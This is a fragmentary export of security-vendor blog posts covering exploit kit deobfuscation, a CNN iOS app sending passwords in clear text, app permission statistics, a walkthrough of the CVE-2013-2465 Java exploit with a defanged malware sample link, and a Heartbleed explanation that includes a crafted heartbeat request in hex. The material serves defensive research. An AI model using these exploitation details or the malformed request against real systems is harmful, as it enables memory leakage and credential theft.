\r\n			Malicious SilverLight Code\r\n		\r\n	\r\n\r\n\r\nDe-obfuscated code for the fourth JavaScript snippet: Exploits Flash vulnerability\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Malicious Flash Code\r\n		\r\n	\r\n\r\n\r\nTo get all of the de-obfuscated code above I would normally need to conduct code analysis to find the ‘dn3d.text’ variable, which contains the de-obfuscated JavaScript code. This would require fair bit of code analysis and understanding of JavaScript and DOM. As such, I wanted to find a simple solution which would provide all of the de-obfuscated JavaScript at once. Fortunately, I was able to identify a shortcut. Since all of the de-obfuscated JavaScript is stored in DOM tree, we can crawl the DOM tree and get the element value once for all of the EK script has executed. For this, I wrote a simple JavaScript routine which I call ‘domWalkerAndDeobfuscator’. By putting this code at the end of the EK sample, we can get all the JavaScript being stored into DOM, which in turn contains the de-obfuscated code.\r\n\r\n \r\n\r\ndomWalkerAndDeobfuscator at the end of EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			domWalkerAndDeobfuscator\r\n		\r\n	\r\n\r\n\r\n‘console.log’ output after appending domWalkerAndDeobfuscator:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMalicious Applet code:\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n Malicious Silverlight code:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMalicious Flash code:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nMy trick worked and gave me the full de-obfuscated code of the Rig EK sample. This increased my curiosity and tried the same ‘domWalkerAndDeobfuscator’ on the Feista exploit kit sample.\r\n\r\n  \r\n\r\nFiesta EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fiesta EK\r\n		\r\n	\r\n\r\n\r\nDe-obfuscated code obtained from ‘domWalkerAndDeobfuscator’ through console.log for Feista EK:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Log\r\n		\r\n	\r\n\r\n\r\nThe Feista EK also contains exploit code for Java, Flash and SilverLight plugins.\r\n\r\n \r\n\r\nAdding a simple DOM walker (crawler) script made the job easy of de-obfuscating DOM based obfuscated EK far easier. I’ve tested the approach with samples of Rig and Fiesta so far and every time was able to get the de-obfuscated code in seconds instead of doing the heavy lifting required for manual analysis.\r\n\r\n \r\n\r\nConclusion: Previously with older EK’s it was easy to de-obfuscate the code using many online tools and with manual analysis, but due to the introduction of DOM based obfuscation techniques the difficulty has increased.

At present, it is sitting at #2 in the iTunes free News app category and #165 among all free apps. Along with providing news stories, alerts and live video, it also includes iReport functionality, allowing users to upload photos, video and narrative to contribute to CNN news reports. The functionality includes the ability to register for an account by providing an email address, username and password. Users can optionally provide a real name and phone number. Logging into an existing iReport account or creating a new account can be accessed via More à Settings àiReport in the main menu. The user can then access the iReport Assignments section, which is accessible via This is CNNàiReport in the main Menu.\r\n\r\n\r\n\r\nVulnerability – Clear Text Passwords\r\n \r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			iReport Functionality\r\n		\r\n	\r\n\r\nThe current CNN for iPhone App (verified on Version 2.30 (Build 4948)) has a key weakness whereby passwords for iReportaccounts are sent in clear text (unencrypted). While this is always a problem, it\'s especially concerning that this relates to functionality which permits people to anonymously submit news stories to CNN. This occurs both when a user first creates their iReport account and during any subsequent logins. Traffic sniffed from the app using Zscaler\'s free ZAPtool illustrates the problem.\r\n \r\n\r\n\r\n\r\n\r\n\r\n\r\nInitial Account Registration\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl:http://audience.cnn.com/services/cnn/register.api\r\n\r\nHost:audience.cnn.com\r\n\r\nUser-Agent: CNN/4948 (iPad; iOS 7.1.2; Scale/2.00)\r\n\r\nRequest Body: nowrap=true&termsOfService=true&displayname=zscaler&password=p%40ssword&privacy=domestic_version&email=zscalertest%40zscaler%2Ecom&kaptcha=3dbgc\r\n\r\n \r\n\r\nSubsequent Login\r\n\r\n \r\n\r\n[-]  Method: POST\r\n\r\nUrl:http://audience.cnn.com/services/cnn/login.api\r\n\r\nHost:audience.cnn.com\r\n\r\nUser-Agent: CNN/4948 (iPad; iOS 7.1.2; Scale/2.00)\r\n\r\nRequest Body: doSso=false&password=p%40ssword&email=zscalertest%40zscaler%2Ecom&nowrap=true\r\n\r\nServer Response:{ , \"status\":\"success\"}\r\n\r\n \r\n\r\nAs can be seen, both transmissions are sent in clear text (HTTP) and the password (p@ssword) is sent unencrypted, along with all other registration/login information. The concern here is that anyone on the same network as the user could easily sniff the victim\'s password and access their account. Once obtained, the attacker could access the iReport account of the user and compromise their anonymity. The same credentials could be used to access the user\'s web based iReport account where any past submissions are also accessible.\r\n\r\nZAP Analysis:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			ZAP analysis\r\n		\r\n	\r\n\r\nWe have tested other CNN mobile apps and found that the Android app does not have this same vulnerability as it uses both SSL encryption for registration/login and SSL certificate pinning. The iReport functionality is not present in the CNN iPad application. The vulnerability was reported to CNN on July 15th. They acknowledged receipt of the report and indicated that they are investigating.\r\n\r\nConclusion\r\n \r\n\r\n \r\n\r\nUnfortunately, it isn’t difficult to identify mobile applications that send authentication credentials in clear text. As mentioned, this was easily identified in a few minutes leveraging ZAP. For end users however, such flaws aren’t as evident. In a web application, a user knows immediately when sensitive information is sent in clear text, as they don’t see the familiar lock and key symbol in their browser or HTTPS in the URL bar. Such feedback is not available in a mobile application, despite the fact that it is sending the same content. End users must rely on both the app developers and app store gatekeepers to prevent such flaws from being exposed in the first place. This vulnerability could easily have been caught by Apple during the vetting process that they subject new applications to before including them in the app store, but our research has shown us that Apple and Google simply aren’t looking for these basic security vulnerabilities.\r\n\r\nNote:\r\nAs this issue was reported to CNN by us, CNN rolled out new updates and fix for this vulnerability.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (183, 'The “Forbidden” Apple: App Stores And The Illusion Of Control Part I', 'Viral Gandhi', 'July 15, 2014', 'There is no doubt we truly live in an “App Economy.” From personal to professional, we direct and live our lives through our smart phones. But while we enjoy the latest games, stream the latest content or catch up on our friend\'s activities, few think about the “App Dichotomy”– The fact that we are at least as much the consumed, as we are the consumer. This is the first in a pair of blogs that break down and analyze the access we grant to our personal information, behaviours and tendencies when we download an App, and the security and privacy risks that result.\r\n \r\n\r\nFirst, we will examine the privacy/security profiles of the most popular iOS apps in the Apple App Store. Apple of course presents an image of a walled and pristine garden where users are safe unless you “bite the apple” and jailbreak your device, exposing it to the evils of unapproved apps. Apple also holds an advantage over Google/Android in that it offers more granular allow/deny control over specific permissions, while still allowing a user to download and use an app.  However, it’s well understood that many users do not scrutinize the permissions requested regardless of choices. And for those who do, even with a cursory review, do they understand what they grant when they click “allow”?\r\n\r\nZscaler to date, has analyzed the top 550 most popular iOS apps, via static analysis techniques, specifically tracking permissions for access to functionality such as: the address book, telephony information (carrier, country code, SIM card info., etc.), user geo-location, calendar, email and unique identifiers. One difference in the approach that we’ve taken, in contrast to previously published statistics that we’ve seen, is that we looked for the express use of various functions to determine that an app actually required specific levels of access. We often see stats based on only the inclusion of a framework within an app. While including the framework provides the app with the ability to access specific functionality, it is common for developers to be aggressive with the frameworks that they include but never actually leverage the functionality.There are many interesting findings in the data, but two findings that we found especially concerning were:\r\n\r\n \r\n\r\n\r\n	38% of applications still have access to the now infamous UDID identifier, that was the center of the AntiSec leak in 2012, and since which time, Apple has banned access. Access to UDIDs is a concern because developers could track user behaviour across multiple apps to track unique user. Developers and ad networks may also map UDIDs to user\'s sensitive information like mobile numbers,name passwords, locations and other information.\r\n	In excess of 60% of Game and Entertainment apps request permission to telephony functions (service provider information and current call information) and geo-location.This is of course more of a privacy concern, than security, but troubling nonetheless. This concerns are important as previously some issues came to light regarding spying on leaky apps. \r\n\r\n \r\n\r\nOne last item before we dive deep into the analysis that we feel is compelling to point out, is that – somewhat ironically – we had to jailbreak the devices. This was necessary in order to access the applications in their running state, and then identify various functions called by the apps to understand the access permissions that they require. This increases the value and validity of these stats, and in some cases calls into question the accuracy of some of the iOS stats that we\'ve previously seen. Most are based on simply seeing a framework being imported (potential use) vs what we did which was look for the use of individual functions (actual use).\r\n \r\n\r\nSo, on to the analysis. We have compiled stats for:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	Address book functionality - Provides a programing interface to the Address book in order to allow an application to access the Addressbook database\r\n	Telephony data information - Provides details on usage of the core telephony framework’s methods, which include access to the cellular service provider information like the cellular service carrier and current call information\r\n	Location tracking - Allows apps to determine user’s current location or heading\r\n	Email Functionality - Usage of the MFMailComposeViewController class’s methods, which provide a standard interface to manage the editing and sending of email messages. With this access, an app would not be able to send mails independently, without user involvement. The app would also not be able to read a user\'s email.\r\n	Calendar data - Allows applications to read/write from/to Calendars, Events and Reminders.\r\n	UUID - Apps can access UUIDs (Universally Unique Identifiers), also known as GUIDs (Globally Unique Identifiers) or IIDs (Interface Identifiers), which are 128-bit values designed to be unique per device.\r\n\r\nThe following overall results were derived from static app analysis:\r\n\r\n\r\n\r\nBelow we see the percentage of applications which are trying to use social media and ad networks. \r\n\r\n\r\n\r\n47% of applications are found to be linked to social networks. We have observed Facebook, Twitter and Instagram as most common social networks used by apps.\r\n\r\n75% of applications are found to be linked to advertisingnetworks. This is not a surprising finding given that all of the apps analyzed were free apps and most have a monetization strategy driven by advertising.\r\n\r\nUDID vs. UUID:\r\n\r\nApple is pushing developers to stop using the unique identifier (UDID) embedded in iPhones and iPads and started rejecting apps that gather UDIDs after May 2013. App developers were warned not to use the “uniqIdentifier”, although it seems that some developers have neglected these warnings. Developers rely on the UDID value to track user activity for targeted advertising and troubleshooting. Since Apple is prohibiting the option to use the unique identifiers, companies are looking for new ways to keep tabs on users while avoiding personal privacy concerns. As an alternative to UDIDs, Apple has instead introduced the UUID (Universally Unique Identifier) created by CFUUIDCreate method, which we will explain below. Since these changes were implemented, developers are now trying to track the user in the following ways:\r\n\r\n \r\n\r\n\r\n	The UDID is tied to the device hardware and no longer permitted by Apple. Apple started rejecting apps which requested the UDID string, although a few legacy apps still exist which use this method.\r\n	The UUID, Apple’s preferred approach is a unique value per app and device. This limits privacy concerns as the user cannot be tracked across apps on a given device. One additional limitation of the UUID is that it is created when the app is first installed and, if the user re-installs the app, a new UUID will be created. In order to get around this limitation, developers are storing the UUID in the user’s keychain to make it persistent across app installs.\r\n	A final option involves querying the MAC address of device. Apple is also now prohibiting the use of MAC addresses tracking. Apple will now reject apps where developers query the MAC address. Additionally, starting with iOS 7, Apple now always returns a fixed value when querying the MAC address to specifically prevent the MAC as base for unique identifier.\r\n\r\nHere are some UDID vs. UUID statistics we derived from our scanned applications.\r\n\r\n\r\n\r\nWe have found 38% of legacy applications are still using the UDID “uniqIdentifier” string which is no longer permitted by Apple. Apple is pushing very hard to ensure that only UUID values are now used in place of UDID and MAC addresses.In support of that, we can see that 92% of apps are now using UUID values to track users.\r\n\r\nStatistics breakdown by App Categories\r\n\r\nThe following details the results of five permission categories from the iTunes store for the top 25+ applications in their respective categories.\r\n\r\nCategory: Games\r\n\r\n\r\n\r\nIn the Games category, we have found that 28% of apps are accessing Address book functionality, 68% of apps are using telephony information, 76% of apps are trying to use the user’s location, 64% apps are using the Email framework and 60% of apps are asking for calendar access. Also, 84% of games are leveraging UUID’s for tracking user activity for targeted advertising.\r\n\r\n                                                Category: Entertainment\r\n\r\n\r\n\r\nIn the Entertainment category, we have observed 20% of apps trying to access address book functionality, 75% of apps are asking for telephony data, 86% of apps are using location APIs to track a user’s location, 88% of apps are using the Email framework and 70% of apps are using calendar data. Additionally, 97% of apps are using UUID’s for tracking.\r\n\r\n                                      Category: Social Networking\r\n\r\n\r\n\r\nIn the Social Networking category, 92% of apps use address book functionality, 72% of apps are asking for telephony information, 96% of apps are using location APIs and the Email framework, while 54% of apps are accessing calendar functionality and 96% of apps track via UUIDs.\r\n\r\n                                      Category: Lifestyle\r\n\r\n\r\n\r\nIn the Lifestyle category, 59% of apps were found to be accessing the address book, 81% of apps are using telephony data, 85% of apps are using the location and Email framework, 51% apps are accessing calendar functionality and all apps scanned were found to be accessing UUIDs.\r\n\r\n                                      Category: Travel\r\n\r\n\r\n\r\nIn the Travel category, we observed 54% of apps with access to the address book, 58% of apps have telephony data access, 92% of apps have access to location information, 77% of apps are using email and 61% of apps are using the calendar framework. Additionally, 92% of apps are leveraging UUIDs.\r\n \r\n\r\nConclusion:\r\n\r\nWith 97% apps using at least one of the functionalities being tracked (address book, telephony, location, email calendar or UUID), as stated, we are being consumed as much, if not more, than we consume.  In and of itself, this is not a danger.  However as threats – and even business practices – evolve, the risk profile of access changes with it. In the case of our findings, while Apple has stated otherwise, it is clear that some developers significantly overreach in permissions requested. And while some “risks” still live inside gates – for example access to Social Media still requires express user permission for an app to post, etc., -- as also stated earlier, many users are click happy and indiscriminate with that permission.  I’ll leave you with a specific access and risk analysis for one app, Draw Something Free.\r\n \r\n\r\nRecommendations:\r\n\r\nTo avoid security and privacy problems, more knowledge about mobile app risk is necessary. As organizations are moving forward with BYOD, infrastructure knowledge of app behaviors helps to avoid security and corporate privacy risks – from location tracking of executives to leaking corporate data.\r\n\r\nUsers and IT always must remain vigilant and aware regarding installed app behaviors. Consider the necessity of any functionality requested by an app before you allow it. For example, why does any game app need to access  your address book? Should an app for kids really be asking for geolocation? Awareness among users about how much access is granted to particular apps is the only way to build the stronger defense against future mobile threats.\r\n \r\n\r\nExample:\r\n\r\nApplication: Draw something free\r\n\r\nMethods identified in the decompiled source code for respective areas of functionality:\r\n\r\n \r\n\r\n\r\n	Address book access:\r\n	ABAddressBookCreate\r\n	ABAddressBookGetAuthorizationStatus\r\n	ABAddressBookRequestAccessWithCompletion\r\n	ABAddressBookSave\r\n	ABAddressBookAddRecord\r\n	ABAddressBookRemoveRecord\r\n	ABRecordGetRecordID\r\n	ABRecordGetRecordType\r\n	ABRecordSetValue\r\n	ABRecordCopyValue\r\n	ABRecordRemoveValue\r\n	ABRecordCopyCompositeName\r\n	ABPersonCreate\r\n	ABPersonGetTypeOfProperty\r\n	ABAddressBookGetPersonWithRecordID\r\n	ABAddressBookCopyArrayOfAllPeople\r\n\r\n \r\n\r\nTelephony Information:\r\n\r\n \r\n\r\n\r\n	carrierName\r\n	carrierName\r\n	mobileCountryCode\r\n	mobileNetworkCode\r\n\r\n \r\n\r\nLocation Access:\r\n\r\n \r\n\r\n\r\n	locationManager:didUpdateLocations:\r\n	locationManager:didUpdateLocations:\r\n	locationManager:didFailWithError:\r\n	locationManager:didFinishDeferredUpdatesWithError:\r\n	locationManager:didUpdateToLocation:fromLocation:\r\n	locationManagerDidPauseLocationUpdates:\r\n	locationManagerDidResumeLocationUpdates:\r\n	locationManager:didUpdateHeading:\r\n	locationManagerShouldDisplayHeadingCalibration:\r\n	locationManager:didEnterRegion:\r\n	locationManager:didExitRegion:\r\n	locationManager:monitoringDidFailForRegion:withError:\r\n	locationManager:didStartMonitoringForRegion:\r\n	locationManager:didChangeAuthorizationStatus:\r\n	initWithLatitude\r\n	horizontalAccuracy\r\n	verticalAccuracy\r\n\r\n \r\n\r\nEmail access:\r\n\r\n \r\n\r\n\r\n	SetSubject\r\n	setToRecipients\r\n	setCcRecipients\r\n	setBccRecipients\r\n\r\n \r\n\r\nCalender access:\r\n\r\n \r\n\r\n\r\n	defaultCalendarForNewEvents\r\n	removeEvent\r\n	saveEvent\r\n\r\n \r\n\r\nUnique Identifier (UUID) access:\r\n\r\n \r\n\r\n\r\n	uniqueIdentifier\r\n	CFUUIDCreateString\r\n	CFUUIDCreate\r\n\r\n \r\n\r\nAd network related URLs found in source code:\r\n\r\n \r\n\r\n\r\n	http://www.flurry.com/resources/privacy/reengagement.html\r\n	http://www.googleanalytics.com/__utm.gif\r\n	utmwv=4.4mi&amp;utmn=%d&amp;utmt=event&amp;utme=5\r\n	http://www.google.com/OAuthCallback\r\n	http://www.googleadservices.com/pagead/aclk\r\n	https://data.flurry.com/aas.do\r\n	https://et.w.inmobi.com/user/e.asm\r\n\r\n \r\n\r\nSocial Network related URLs found in the source code:\r\n\r\n \r\n\r\n\r\n	http://twitter.com/WeDrawSomething\r\n	http://www.facebook.com/playdrawsomething\r\n	https://api.twitter.com\r\n	https://api.twitter.com/1/statuses/update.json\r\n	https://api.twitter.com/oauth/access_token\r\n	https://api.twitter.com/oauth/authorize\r\n	https://api.twitter.com/oauth/request_token\r\n\r\nReferences:\r\n\r\n\r\nhttps://developer.apple.com/library/ios/navigation/\r\n\r\nhttps://developer.apple.com/news/?id=3212013a\r\n\r\nhttp://techcrunch.com/2013/06/14/ios-7-eliminates-mac-address-as-tracking-option-signaling-final-push-towards-apples-own-ad-identifier-technology/', 'Analysis;Mobile Malware', 'https://www.zscaler.com/blogs/research/forbidden-apple-app-stores-and-illusion-control-part-i');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (184, 'And The Mice Will “Play”…: App Stores And The Illusion Of Control Part II', 'Viral Gandhi', 'July 15, 2014', 'In the last blog, we began analyzing what we’ve termed the “App Dichotomy” of the App Economy – The fact that we are at least as much the consumed, as we are the consumer. Our goal was to analyze popular apps from Apple’s App Store and Google Play to determine how permissive developers have tried to be, and the security and privacy risks we accept when we download them to our smartphones. \r\n \r\n\r\nThis blog will look at Android apps from the Google Play store. While Android was once the open and transparent rebel to Apple’s rigid and restrictive iPhone, it has of late taken on more the image of a questionable rogue. While the App Store has been accused of being a bit of a police state, the Play store has been accused of being too loose and lazy with its oversight. And when the cat is away…\r\n \r\n\r\nCompounding concern and creating more privacy risk is the fact that Android operates in an all-or-nothing permission fashion, where users accept the entire laundry list of requested permissions or the app cannot be downloaded. This model likely has more users putting less scrutiny on permissions to achieve that instant app gratification.\r\n \r\n\r\nFor this analysis, Zscaler analyzed more than 75,000 apps from the Google Play store in order to determine the permissions that are commonly requested by the apps at the time of installation. As with Apple, there were many interesting and revealing findings, but in this effort, two of the most compelling findings were:\r\n\r\n\r\n	68% of apps that request SMS permissions ask for the ability to send SMS messages. With most Android malware currently targeting premium SMS fraud, this is concerning, especially as users tend to indicriminately accept requested permissions without scrutinizing whether or not they’re truly needed.\r\n	28% of apps with SMS permissions also request read SMS access. This is somewhat unsettling as an increasing number of apps/services send codes via SMS for mobile banking or two factor authentication.\r\n\r\nAs with the iOS analysis, I’d also like to take a moment to discuss the approach. While jailbreaking is necessary on an iOS device in order to do any kind of static analysis, this is not the case for Android apps.  It is the primary reason our analysis numbers are much higher for Android as no manual intervention is involved.\r\n \r\n\r\nNow on to the analysis. Android is based on a permission system, and each permission represents a given task. Applications can request required permissions and also define new permissions. For example, an application may declare that it requires access to the Internet. As discussed, Android permissions cannot be denied or granted after installation. An Android application declares the required permissions in its AndroidManifest.xml configuration file.\r\n \r\n\r\nFor this analysis, we focused on some of the more dangerous permissions, which allow apps to access a user’s personal information and grant access to functionality such as SMS, the address book etc. \r\n \r\n\r\nBelow is the list of the permissions which we consider to be higher risk permissions:\r\n\r\n\r\n\r\n	SMS related permissions\r\n	GPS related permissions\r\n	Phone call related permissions\r\n	Personal information related permissions\r\n	Address book related permissions\r\n	Device information related permissions\r\n\r\n\r\n\r\nOverall permission analysis:\r\n\r\nThe following graph illustrates the prevalence of dangerous permissions for all Android apps analyzed to date.\r\n\r\n\r\n\r\n\r\nFrom the graph, you can see that of the 75K+ Android apps analyzed, 36% of the apps request location permissions. 46% of apps are asking for the phone\'s state permission, which allows apps to access your SIM card information, IMEI number etc. 7% of apps are requesting SMS permissions, 10% request access to a user’s address book and 4% request access to the calendar.\r\n\r\n \r\n\r\nSMS Permissions breakdown:\r\n\r\nSMS permissions can be further broken down into the following categories:\r\n\r\n \r\n\r\n\r\n	READ_SMS permission: This permission allows the application to read all messages\r\n	WRITE_SMS permission: This permission allows the application to write SMS messages \r\n	RECEIVE_SMS permission: This permission allows the application to monitor incoming SMS messages to record or process them\r\n	SEND_SMS permission: This permission allows the application to send SMS messages\r\n\r\n \r\n\r\n\r\n\r\nHere we can see that, from all applications that have access to SMS, most ask for SEND_SMS permissions, which allow apps to send SMS messages from your phone. As the mobile malware market grows, most of the Android malware leverages SMS fraud. We have seen plenty of malware in the past, which abuses SMS by sending messages to premium phone numbers. Also, you can see that a quarter of applications are asking for READ_SMS permissions, which are more dangerous than WRITE_SMS permission as this can expose privacy concernssuch as intercepting two factor authentication schemes leveraging out of band SMS messages.\r\n \r\n\r\nAddress book permission breakdown:\r\n\r\nConsidered permissions:\r\n\r\n \r\n\r\n\r\n	WRITE_CONTACTS: This permission allows the application to write to the user’s contact data\r\n	READ_CONTACTS: This permission allows the application to read from the user’s contact date \r\n\r\n\r\n \r\n\r\n\r\n \r\n\r\nHere, you can see most of the apps are asking for READ_CONTACT permissions. It is always important to watch this permission as some apps, especially social networking apps, leverage your contact information in order to grow their install base. They want to check your address book to reach out to your friends and encourage them to install the same app.    \r\n\r\n \r\n\r\nInternet and network related permission analysis:\r\n\r\nPermission considered:\r\n\r\n \r\n\r\n\r\n	ACCESS_NETWORK_STATE: This permission allows the application to access information about the networks in use\r\n	INTERNET: This permission allows the app to open and close the network socket in order to connect to the Internet\r\n\r\n \r\n\r\n\r\n \r\n\r\n \r\nForm our data, we have seen that 90% of apps are requesting Internet access and 80% of apps are requesting network discovery permissions, which allow the app to determine the user’s cellular network connectivity, such as whether the user is using 3G or 2G etc.\r\n\r\n \r\n\r\nConclusion: \r\n\r\nFrom our analysis, outside of Internet permissions, a significant number of apps request access to the phone’s state permissions, which provide apps with the ability to harvest SIM card information and IMEI number information.\r\n\r\n \r\n\r\nWhy is this important? Apps, and especially the advertising libraries they utilize, want to be able to track user behavior across apps. By having access to unique identifiers, such as the IMEI, the same user (or at least the same device) can be identified when accessing various content or apps. This allows advertisers to better customize the advertisements that are delivered. Some people are fine with this, but others consider it a breach of privacy. The second most common permissions sought by Android apps involve GPS and user location. GPS data can also be used by advertisers to better target ads, apps are also increasingly becoming location aware, with apps such as Uber leveraging geolocation information to deliver a given service.\r\n\r\n \r\n\r\nSMS permissions provide apps with the ability to communicate, but can also be abused for monetary gain as we have seen with many premium SMS scams. Address book permissions tend to be leveraged to allow apps to grow their install base by encouraging users to promote their apps to friends. While Google does a reasonable job of weeding out malicious apps from the Google Play store, they aren’t perfect, so users should be selective when granting app permissions. This is especially true outside of official app stores such as Google Play, where app scrutiny may be limited - if it exists at all.\r\n\r\n \r\n\r\nRecommendations:\r\n\r\nUsers should be aware of the permissions they grant and the impact they could have on their device and their privacy. This knowledge will allow users to make better decisions when installing applications. For example, why would a wallpaper app require device SMS permissions?

Although this EK first emerged in August 2013, the authors have constantly updated their exploitation code to evade detection. It mostly targets known vulnerabilities in Java and Microsoft Silverlight for exploitation. We identified a .jar file attached to a FiestaEK landing page and on performing some manual code analysis, found it to be exploiting the CVE-2013-2465Java vulnerability.    There isn’t much detail available regarding how the exploit actually occurs, so we really wanted to walk through each step of the attack and explain each step in detail. The code as you will see is constructed in a way to avoid static detection using string searches or Yara scans.         Jar file details:    MD5 hash: ed2e61b302c6ed7ccb3699cc33d23f71    VirusTotal report: 16/54         The malicious jar file can also be downloaded from here (hxxp://www.malware-traffic-analysis.net/2014/06/07/2014-06-07-Fiesta-EK-malware.zip). It contains the following six classes.                                          The malware author tries to complicate the program by constructing strings using String.replace(). For eg:                                       Here, lies() replaces the substring “un6u4vy46” with “e” in all places present in the 1st parameter to form “createWritableRaster”. Even the random class and method names and the scattered code makes analyzing the code a challenge.         The execution of the .jar file is triggered from a compromised website. The execution starts through the entry point “sash0k.start()” method with a long string parameter which it gets from the host site itself. URL domains are extracted from this string and stored in an array. Malware will connect to these domains and download actual malware executables after the machine has been successfully compromised. Let’s look at each step in detail.    Initially, the code creates two BufferedImage objects in two different ways. Let’s have a look on both.         First object: “localBufferedImage1”    Reflection(Java.lang.reflect) is used to invoke the setPixel() method present in the java.awt.image.CreateWritableRaster class using an object of BufferedImage subclass of the java.awt.image package. An integer type object is then passed to set the Raster values. The returned object is typecast to BufferedImage type and is stored as localBufferedImage1.                      Second object: “localBufferedImage2”    The second object is created by passing an object of the ComponentColorModel class to its parameterized constructor.                 An important thing to note is that this ComponentColorModel object is created by passing an object of ICC_ Colorspace constructed from an ICC_Profile instance.                     The SampleModel used in this case is the MultiPixelPackedSampleModel which has an interesting feature of writing the DataBuffer in the image. To be clear, these two objects are different from each other. Many image related classes are used in this code, but the only goal is to capture the flag!    The actual exploitation occurs when the AffineTransformOp.filter() method is called with the two BufferedImage objects as parameters. It is supposed to perform a linear mapping from 2D coordinates in the source Raster to 2D coordinates in the destination Raster.                               But before initiating the transformation, the ColorSpace compatibility is checked through the isCompatibleRaster() method of class “java.awt.image.ColorModel”. This method becomes vulnerable because code bypasses this compatibility check to always return “True” by overriding it in a base class, which is Class “tiel3k” in our case. The destination raster memory array is then overflown resulting in heap corruption.                          This vulnerability is thus named as the “Incorrect image channel verification” vulnerability.    Because the .jar runs as applet in user’s browser, the code must use SecurityManager and get required permissions to perform privileged actions like creating and executing files in memory in our case.  As we can guess, the destination of the overflow is in the heap region of localBufferedImage2 and the above access permissions are given only to this object. Fields of volatile data types are created to allocate memory and write data in it. If we go more deeper in the code, we see that 8192 bytes (8Kb) memory was reserved for localBufferedImage2 object (assuming a 4 byte Integer).             Now since the code has bypassed the Java sandbox protections of a browser, it’s ready to perform some privileged actions like file download and execution on the user machine. The code ultimately connects to various URL domains, downloads .exe files, stores them in the <temp> folder and executes them.                     Since there has been no Java vulnerabilities reported as of yet in 2014, malware authors are using old exploits and rewriting the code with additional obfuscations. Zscaler provides JavaTestwhich is a free tool for checking the current java version. The best way to stay safe is to regularly update to the current version of Java or to remove it altogether if it isn’t necessary to the machine in question.', 'Vulnerability', 'https://www.zscaler.com/blogs/research/exploring-java-vulnerability-cve-2013-2465-used-fiesta-ek');

Vulnerable Result Shown for Heartbleed OpenSSL Check  		  	    For more information on why heartbleed is such a serious vulnerability, take a look at our earlier blog which details how exploitation occurs. In a nutshell, the heartbeat TLS extension allows one machine to send a small packet to another to keep a TLS connection open. That request includes a small message, which the responding machine subsequently includes in the reply. The problem occurs as the request also includes a parameter indicating the size of the message, which is not properly validated in some versions of OpenSSL. Therefore, if the size value is larger than the actual size of the message, the response will also include random data from memory to fill the void. This is a serious data leakage issue as the response could include sensitive information such as passwords, cookies and even private encryption keys. The impact of this vulnerability is also exacerbated by the fact that OpenSSL is such a popular SSL implementation, leaving many popular websites vulnerable.    Now when you run a ZULU scan, as part of the overall content checks, we also send a heartbeat request to port 443 on the server. We check to see if an SSL server is present and if it will respond to a request where the specified message size does not match the actual length of the message. If that\'s the case, the report will state \'Heartbleed OpenSSL Result: Vulnerable\' in the report and the overall score will be adjusted accordingly.    - michael', 'Vulnerability', 'https://www.zscaler.com/blogs/research/heartbleed-check-added-zulu');

In fact, according to Netcraft, in April 2014, Apache and nginx, two of the most popular web servers that both include vulnerable Open SSL implementations, account for 66% of active web servers. As for depth, the impact of the vulnerability is significant and trivial to exploit. A simple request will return up to 64 KB of random data from server memory. This data could include extremely sensitive information such as private encryption keys and authentication credentials. To make matters worse, there are no logs of such requests, so a victim won\'t even know that they were attacked and the exploit can be sent over and over, retrieving new data every time.\r\n\r\nHow does it work?\r\nThe heartbeat extension is defined in RFC 6520 and was added to the TLS protocol to provide a simple means of keeping a TLS session alive. Think of it as a small packet that the client sends to the server to let it know that it\'s still around. The problem occurs, because that simple packet includes the length of the payload that it\'s sending, which isn\'t properly validated. If the actual payload is smaller that the payload length value, the server will return random data from memory to fill the void. There is already plenty of PoC exploit code for this vulnerability readily available on the web if you want to test your own servers.  Let\'s break down a sample heartbeat request to illustrate the vulnerability (some hexadecimal values have been converted to decimal in the description).\r\n\r\n|18 03 02 00 0A 01 40 00 4D 49 43 48 41 45 4C|\r\n|#1| #2  | #3  |#4| #5  |         #6         |\r\n\r\n#1 - Type = 24\r\n#2 - Version = 0x302\r\n#3 - Data length = 10 (#4 + # 5 + #6)\r\n#4 - TLS1_HB_REQUEST\r\n#5 - Total payload length (16,384 bytes)\r\n#6 - Data (\'MICHAEL\')\r\nThe problem?\r\nIn this example, the data length is 10 bytes, while the total length of the payload is set to 16,384 bytes. Due to improper bounds checking, the server ultimately returns both the data sent in the heartbeat request, along with whatever else happens to come after it in memory. In the screenshot below, you can clearly see the heartbeat payload (\'MICHAEL\') sent to a vulnerable server, is followed by random browser headers - likely from a recently requested webpage on that server.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Data leakage from a web server vulnerable to the OpenSSL \'heartbleed\' attack \r\n		\r\n	\r\n\r\n\r\nThe verdict\r\nThis is a serious threat.

